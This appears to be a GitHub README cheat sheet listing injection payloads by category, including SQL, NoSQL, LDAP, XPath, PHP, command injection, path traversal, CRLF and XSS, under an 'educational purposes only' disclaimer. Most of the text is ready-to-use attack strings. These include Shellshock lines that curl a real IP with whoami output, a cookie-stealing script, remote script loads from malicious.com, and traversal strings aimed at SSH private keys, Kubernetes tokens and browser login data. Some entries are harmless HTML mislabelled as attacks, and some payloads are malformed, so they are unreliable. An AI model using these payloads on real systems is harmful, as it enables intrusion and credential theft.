Injections Attack example by: [pxcs](https://github.com/pxcs/)

<a href="https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/"><img src="https://png.pngtree.com/png-vector/20231205/ourmid/pngtree-artificial-intelligence-bionic-human-robot-png-image_10814416.png" align="right" width="100" alt="robot"></a>

> [<img src="https://www.pngmart.com/files/23/Needle-PNG-Isolated-File.png" width="30">]() A common attack vector that uses malicious SQL code for backend database manipulation to access information that was not intended to be displayed. This information may include any number of items, including sensitive company data.
<hr>

### List of query injection: 

| 💉 HTML Injections |
| ---- |
| ```</title></head><body><img src=http://myImage.png>``` |
| ```<META HTTP-EQUIV="refresh" CONTENT="1;url=http://www.test.com">``` |
| ```<a href="https://www.google.com">HTML</a>``` |
| ```<img src="index.jpg" alt="Girl in a jacket" width="500" height="600">``` |
| ```<input type="text" id="name" name="name">``` |
| ```<noscript>Sorry, your browser does not support Html</noscript>``` |
| ```<progress id="html" value="32" max="100"> 32% </progress>``` |
| ```<canvas id="myCanvas">draw htmli</canvas>``` |
| ```<datalist id="html"><option value="html"></datalist>``` |
| ```<embed type="text/html" src="index.html" width="500" height="200"> ``` |
| ```<head><title>html</title></head>``` |
| ```<meter id="html" value="2" min="0" max="10">2 out of 10</meter>``` |
| ```%253Ci%253Ehtml%253C%252Fi%253E``` |
| ```<video width="320" height="240" controls></video>``` |
| ```<h1>html</h1>``` |

| 💉 HTML Injection Read File |
| ---- |
| ```/home/$USER/.bash_history``` |
| ```%2Fetc%2Fpasswd%2500``` |
| ```....//....//....//....//....//....//....//etc/passwd%00``` |
| ```%2Fetc%2Fknockd.conf``` |
| ```..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fhosts``` |
| ```..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fmotd``` |
| ```..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fmysql%2Fmy.cnf``` |
| ```..%2F..%2F..%2F..%2F..%2F..%2Fproc%2F%5B0-9%5D*%2Ffd%2F%5B0-9%5D*``` |
| ```..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron``` |
| ```..%2F..%2F..%2F..%2F..%2F..%2Fhome%2F%24USER%2F.ssh%2Fid_rsa``` |
| ```/run/secrets/kubernetes.io/serviceaccount/token``` |
| ``..%2F..%2F..%2F..%2F..%2F..%2Frun%2Fsecrets%2Fkubernetes.io%2Fserviceaccount%2Ftoken`` |
| ```/var/lib/mlocate/mlocate.db``` |
| ```..%2F..%2F..%2F..%2F..%2F..%2Fvar%2Flib%2Fmlocate.db``` |
| ```../../../../../../proc/net/arp``` |
<br>

| 💉 SQL Injections |
| ---- |
| ```0' or '0' = '0``` |
| ```1' or '1' = '1``` |
| ```' or ''-'``` |
| ```or true--``` |
| ```')) or (('x'))=(('x``` |
| ```")) or (("x"))=(("x``` |
| ```' OORR 1<2 #``` |
| ```admin' or '1'='1'--``` |
| ```admin' or '1'='1'#``` |
| ```admin') or ('1'='1``` |
| ```' or 'one'='one``` |
| ```' or uname like '%``` |
| ```") or ("1"="1"--``` |
| ```' or 1=1 LIMIT 1;#``` |
| ```') or ('a'='a and hi") or ("a"="a``` |
| ```123 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055``` |
| ```ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A'))``` |
| ```ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6``` |
| ```ORDER BY 1,SLEEP(5),3,4#``` |
| ```UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14``` |
| ```UNION ALL SELECT @@VERSION,USER(),SLEEP(5)--``` |
| ```AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))#``` |
| ```AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))``` |
| ```UNION ALL SELECT 'INJ''ECT''XXX',2,3,4``` |
| ```UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4#``` |
| ```admin') or '1'='1'/*``` |
| ```admin') or ('1'='1'--``` |
| ```benchmark(50000000,MD5(1))--``` |
| ```or benchmark(50000000,MD5(1))--``` |
| ```")) or sleep(5)="``` |

| 💉 PHP Injections |
| ---- |
| ```&&id``` |
| ```;system('id')``` |
| ```system('cat /etc/passwd');``` |
| ```shell exec("id")``` |
| ```exec("ping -c 4 192.168.1.6")``` |
| ```PASSTHRU("id")``` |
| ```phpinfo();system('cat /etc/passwd')``` |
| ```print_r($_POST);system('id')``` |
| ```pcntl_exec("/usr/bin/uptime")``` |
| ```file get contents ("/etc/passwd")``` |
| ```$file = fopen ("testl.txt", "w"); echo fwrite($file, "Hello World. Testing!"); fclose($file)``` |
| ```$file = fopen ("phpinfo-1.php", "W"); echo fwrite ($file, "<?php phpinfo(); ?>"); fclose ($file)``` |
| ```$file = fopen(".php", "w"); echo ($file, "php -r '$sock='' ('' ,) ;' /bin/sh -i <83 >83 2-83' ;"); fclose($)``` |
| ```passthru('id')``` |
| ```echo%20file_exists("index.html");``` |
| ```ECHO%20FILE_EXISTS("/etc/passwd");``` |
| ```echo%20copy("/etc/passwd","/tmp/passwd");``` |
| ```echo%20file_get_contents("/etc/passwd");``` |
| ```echo%20file_put_contents("index.html","Hello%20World.%20Testing!");``` |
| ```ECHO%20FILE_PUT_CONTENTS("index.html","HELLO%20WORLD.%20TESTING!");``` |
<br>

| 💉 NoSQL Injections |
| ---- |
| ```username[$ne]=toto&password[$ne]=toto``` |
| ```login[$gt]=admin&login[$lt]=test&pass[$ne]=1``` |
| ```login[$nin][]=admin&login[$nin][]=test&pass[$ne]=toto``` |
| ```{ "username": { "$ne": null }, "password": { "$ne": null } }``` |
| ```{ "username": "admin' OR '1'='1", "password": "password" }``` |
| ```EVAL "return redis.call('info')" 0``` |
| ```FOR user IN users FILTER user.username == 'admin' 1 == 1 RETURN user``` |
| ```{ "username": "admin", "password": { "$where": "this.password.length > 0" } }``` |
| ```username[$ne]=toto&password[$regex]=md.{1}``` |
| ```";return 'a'=='a' && ''=='``` |
<br>

| 💉 LDAP Injections |
| ---- |
| ```(uid=*)(userPassword=*)``` |
| ```(uid=admin)((uid=*)(userPassword=*))``` |
| ```(uid=*admin*)``` |
| ```(&(uid=admin)(!(userPassword=*)))``` |
| ```(&(uid=admin)(userPassword=pa*))``` |
| ```((uid=admin)(uid=*))``` |
| ```*)(uid=*))((uid=*``` |
| ```(&(uid=admin)((userPassword=wrongpassword)(userPassword=*)))``` |
| ```(uid=*)(userPassword=*)(cn=admin)``` |
| ```(&(uid=admin)(objectClass=*))((uid=*)(objectClass=inetOrgPerson))``` |
| ```String filter = "(&(uid=" + username + ")(userPassword=" + password + "))";``` |
| ```(&(uid=admin)(&)(userPassword=anyPassword))``` |
| ```(&(uid=admin)(userPassword=*)(uid=*)``` |
| ```(&(uid=admin)(userPasswordDomain=*)(uid=*)``` |
| ```admin)(&``` |
| ```(*)(&``` |
| ```*)(&``` |
<br>

| 💉 XPath Injections |
| ---- |
| ```' or true() or '``` |
| ```' or '1'='1``` |
| ```' or name()='username' or '``` |
| ```' or 'a'='a``` |
| ```' or 1=1 or '1'='1``` |
| ```' or count(/*)=1 or '``` |
| ```' or //user/*='admin' or '``` |
| ```' or 'x'='x') or ('y'='y``` |
| ```' or 1=1 or '1'='1'/* ``` |
| ```String xpathQuery = "//user[username/text()='" + username + "' and password/text()='" + password + "']";``` |
| ```//user[username/text()='' or '1'='1' and password/text()='password']``` |
| ```//user[username/text()='username' and password/text()='' or '1'='1']``` |
<br>

| 💉 Command Injection Unix |
| ---- |
| ```&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;``` |
| ```&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;``` |
| ```&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;``` |
| ```() { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=16?user=\`whoami\`"``` |
| ```() { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=18?pwd=\`pwd\`"``` |
| ```() { :;}; /bin/bash -c "sleep 1 && echo vulnerable 1"``` |
| ```() { :;}; /bin/bash -c "sleep 6 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=9&?vuln=9"``` |
| ```() { :;}; /bin/bash -c "wget http://135.23.158.130/.testing/shellshock.txt?vuln=4"``` |
| ```{{ get_user_file("/etc/passwd") }}``` |
| ```() { :;}; /bin/bash -c "sleep 6 && echo vulnerable 6"``` |
| ```ca$@t /etc/passwd``` |
| ```cat $(xxd -r -ps <(echo 2f6574632f706173737764))``` |

| 💉 Command Injection Windows |
| ---- |
| ```C:\Users\{username}\AppData\Local\FileZilla``` |
| ```C:\Users\{username}\AppData\Local\Google\Chrome\User Data\Default\Login Data``` |
| ```C:\Users\{username}\AppData\Roaming\FileZilla\logs``` |
| ```C:\Users\{username}\AppData\Roaming\Microsoft\Credentials``` |
| ```C:\Windows\System32\drivers\etc\hosts``` |
| ```C:\Windows\System32\LogFiles\W3SVC1``` |
<br>

| 💉 XPath Injections |
| ---- |
| ```' or name()='username' or '``` |
| ```' or 1=1 or '1'='1``` |
| ```' or 1=1 or '1'='1'/*``` |
| ```//user[username/text()='username' and password/text()='' or '1'='1']``` |
<br>

| 💉 Java Script Injections |
| ---- |
| ```<script>alert('Injected!');</script>``` |
| ```<script>document.location='http.com/steal?cookie=' + .cookie;</script>``` |
| ```<script>window.location='http://malicious.com';</script>``` |
| ```<script>document.body.innerHTML = '<h1>Hacked!</h1>';</script>``` |
| ```<script>while(true){}</script>``` |
| ```<script src="http://malicious.com/malicious.js"></script>``` |
| ```<div>Welcome, <span id="username"></span></div>``` |
| ```document.getElementById('user').innerHTML = getQueryParameter('user');``` |
| ```http://example.com?username=<script>alert('Injected!');</script>``` |
<br>

| 💉 JSON Injections |
| ---- |
| ```{ "username": "admin", "password": { "$ne": null } }``` |
| ```{ "username": "user", "password": "password", "admin": true }``` |
| ```{ "username": "user", "password": "password", "password": "malicious" }``` |
| ```{ "username": "user", "bio": "<script>alert('Injected!');</script>" }``` |
| ```{ "username": "user", "password": { "$gt": "" } }``` |
| ```{ "user": { "name": "admin", "role": "user" }, "user": { "role": "admin" } }``` |
| ```{ "username": "user", "callback": "require('child_process').exec('ls')" }``` |
| ```{ "username": "user", "password": "' OR '1'='1" }``` |
| ```{"username": "admin","password": "' OR '1'='1"}``` |
<br>

| 💉 XML Injections |
| ---- |
| ```<user><name>admin</name><password>' or '1'='1</password></user>``` |
| ```<user><name>admin</name><password><admin>true</admin></password></user>``` |
| ```<user><name><![CDATA[admin]]></name><password><![CDATA[' or '1'='1]]></password></user>``` |
| ```<user><name>admin' or '1'='1</name><password>password</password></user>``` |
| ```<user role='admin'><name>user</name><password>password</password></user>``` |
<br>

| 💉 Directory Traversal Injections |
| ---- |
| ```/admin/(S(X))/main.aspx``` |
| ```/admin/Foobar/(S(X))/../(S(X))/main.aspx``` |
| ```/(S(X))/admin/(S(X))/main.aspx``` |
| ```/var/log/nginx/error.log``` |
| ```../../../../../../../../../etc/passwd``` |
| ```/../../../../../../../../../../../etc/passwd%00.jpg``` |
| ```/proc/self/cwd/index.php``` |
| ```/ = %c0%af, %e0%80%af, %c0%2f``` |
| ```%uff0e%uff0e%u2216``` |
<br>

| 💉 CRLF Injections |
| ---- |
| ```/%%0a0aSet-Cookie:crlf=injection``` |
| ```/%0aSet-Cookie:crlf=injection``` |
| ```/%0d%0aSet-Cookie:crlf=injection``` |
| ```/%0dSet-Cookie:crlf=injection``` |
| ```/%23%0aSet-Cookie:crlf=injection``` |
| ```/%23%0d%0aSet-Cookie:crlf=injection``` |
| ```/%23%0dSet-Cookie:crlf=injection``` |
| ```/%25%30%61Set-Cookie:crlf=injection``` |
| ```/%25%30aSet-Cookie:crlf=injection``` |
| ```/%250aSet-Cookie:crlf=injection``` |
| ```/%25250aSet-Cookie:crlf=injection``` |
| ```/%2e%2e%2f%0d%0aSet-Cookie:crlf=injection``` |
| ```/%2f%2e%2e%0d%0aSet-Cookie:crlf=injection``` |
| ```/%2F..%0d%0aSet-Cookie:crlf=injection``` |
| ```/%3f%0d%0aSet-Cookie:crlf=injection``` |
| ```/%u000aSet-Cookie:crlf=injection``` |
<br>

| 💉 XSS Attacks |
| ---- |
| ```"-prompt(8)-"``` |
| ```'-eval("window['pro'%2B'mpt'](8)")-'``` |
| ```"onclick=prompt(8)>"@x.y``` |
| ```"onclick=prompt(8)><svg/onload=prompt(8)>"@x.y``` |
| ```<image/src/onerror=prompt(8)>``` |
| ```<img/src/onerror=prompt(8)>``` |
| ```<image src/onerror=prompt(8)>``` |
| ```</scrip</script>t><img src =q onerror=prompt(8)>``` |
| ```<script\x20type="text/javascript">javascript:alert(1);</script>``` |
| ```<script\x3Etype="text/javascript">javascript:alert(1);</script>``` |
| ```<script\x0Dtype="text/javascript">javascript:alert(1);</script>``` |
| ```<script\x09type="text/javascript">javascript:alert(1);</script>``` |
| ```<script\x0Ctype="text/javascript">javascript:alert(1);</script>``` |
| ```<script\x2Ftype="text/javascript">javascript:alert(1);</script>``` |
| ```<script\x0Atype="text/javascript">javascript:alert(1);</script>``` |
| ```'`"><\x3Cscript>javascript:alert(1)</script>``` |
| ```<img src=1 href=1 onerror="javascript:alert(1)"></img>``` |
| ```<body src=1 href=1 onerror="javascript:alert(1)"></body>``` |
| ```<image src=1 href=1 onerror="javascript:alert(1)"></image>``` |
| ```<object src=1 href=1 onerror="javascript:alert(1)"></object>``` |
| ```<svg onResize svg onResize="javascript:javascript:alert(1)"></svg onResize>``` |
| ```<title onPropertyChange title onPropertyChange="javascript:javascript:alert(1)"></title onPropertyChang``` |
| ```<iframe onLoad iframe onLoad="javascript:javascript:alert(1)"></iframe onLoad>``` |
| ```<body onMouseEnter body onMouseEnter="javascript:javascript:alert(1)"></body onMouseEnter>``` |
| ```<body onFocus body onFocus="javascript:javascript:alert(1)"></body onFocus>``` |
| ```<frameset onScroll frameset onScroll="javascript:javascript:alert(1)"></frameset onScroll>``` |
| ```<script onReadyStateChange script onReadyStateChange="javascript:javascript:alert(1)"></script onReadyS``` |
| ```<html onMouseUp html onMouseUp="javascript:javascript:alert(1)"></html onMouseUp>``` |
| ```<svg onLoad svg onLoad="javascript:javascript:alert(1)"></svg onLoad>``` |
| ```<html onMouseOver html onMouseOver="javascript:javascript:alert(1)"></html onMouseOver>``` |
| ```<html onMouseOut html onMouseOut="javascript:javascript:alert(1)"></html onMouseOut>``` |
| ```<body onResize body onResize="javascript:javascript:alert(1)"></body onResize>``` |
| ```<applet onreadystatechange applet onreadystatechange="javascript:javascript:alert(1)"></applet onreadys``` |
| ```<body onpagehide body onpagehide="javascript:javascript:alert(1)"></body onpagehide>``` |
| ```<iframe onload iframe onload="javascript:javascript:alert(1)"></iframe onload>``` |
| ```<!--\x3E<img src=xxx:x onerror=javascript:alert(1)> -->``` |
| ```<a href="javas\x03cript:javascript:alert(1)" id="fuzzelement1">test</a>``` |
| ```<a href="javas\x04cript:javascript:alert(1)" id="fuzzelement1">test</a>``` |
| ```<style></style\x0A<img src="about:blank" onerror=javascript:alert(1)//></style>``` |
| ```<script>if("x\\xE0\xB9\x92".length==2) { javascript:alert(1);}</script>``` |
| ```<script src="data:\xD4\x8F,javascript:alert(1)"></script>``` |
| ```<iframe src=http://xss.rocks/scriptlet.html <``` |
| ```<OBJECT TYPE="text/x-scriptlet" DATA="http://xss.rocks/scriptlet.html"></OBJECT>``` |
| ```<IMG SRC="javascript:alert('XSS');">``` |
<hr>

I know there is a lot more types, languages and attack method out there, here are just a simple list and example, I will update it soon. Big thanks to the [internet](https://www.youtube.com/watch?v=wcaiKgQU6VE&pp=ygUQcXVlcnkgaW5qZWN0aW9ucw%3D%3D) for the references. ***Note***, this module and list was just for an educational purposes only.
